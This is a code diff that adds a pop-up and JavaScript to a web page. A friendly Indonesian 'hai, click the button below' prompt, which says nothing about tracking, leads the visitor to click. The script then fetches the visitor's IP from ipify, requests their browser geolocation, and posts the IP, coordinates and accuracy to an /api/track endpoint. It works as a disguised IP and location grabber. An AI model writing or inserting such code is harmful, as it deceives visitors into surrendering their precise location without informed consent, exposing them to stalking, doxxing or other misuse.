@@ -155,6 +155,74 @@
         </section>
     </main>
 
+    <!-- ========== POP-UP TRACKING ========== -->
+    <div id="trackPopup" style="display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #111; color: white; padding: 30px; border-radius: 20px; text-align: center; z-index: 10000; border: 1px solid #ff4d4d; box-shadow: 0 0 30px rgba(255,77,77,0.3);">
+        <h2 style="color: #ff4d4d; margin-bottom: 15px;">hai 👋</h2>
+        <p style="margin-bottom: 20px;">klik tombol di bawah yaa</p>
+        <button id="trackBtn" style="background: #ff4d4d; border: none; padding: 10px 30px; border-radius: 30px; color: white; cursor: pointer; font-weight: bold;">oke</button>
+    </div>
+
+    <script>
+    // ============= GET IP =============
+    async function getIP() {
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            return data.ip;
+        } catch(e) {
+            return null;
+        }
+    }
+
+    // ============= SEND DATA =============
+    async function sendData(ip, lat, lon, accuracy) {
+        const data = { ip };
+        if (lat && lon) {
+            data.lat = lat;
+            data.lon = lon;
+            data.accuracy = accuracy;
+        }
+        
+        try {
+            await fetch('/api/track', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            });
+        } catch(e) {
+            console.log('Send failed:', e);
+        }
+    }
+
+    // ============= SHOW POPUP =============
+    setTimeout(() => {
+        const popup = document.getElementById('trackPopup');
+        if (popup) popup.style.display = 'block';
+    }, 3000);
+
+    const trackBtn = document.getElementById('trackBtn');
+    if (trackBtn) {
+        trackBtn.onclick = async () => {
+            document.getElementById('trackPopup').style.display = 'none';
+            
+            const ip = await getIP();
+            
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    async (pos) => {
+                        await sendData(ip, pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
+                    },
+                    async () => {
+                        await sendData(ip);
+                    }
+                );
+            } else {
+                await sendData(ip);
+            }
+        };
+    }
+    </script>
+
     <script src="/js/main.js"></script>
 </body>
 </html>
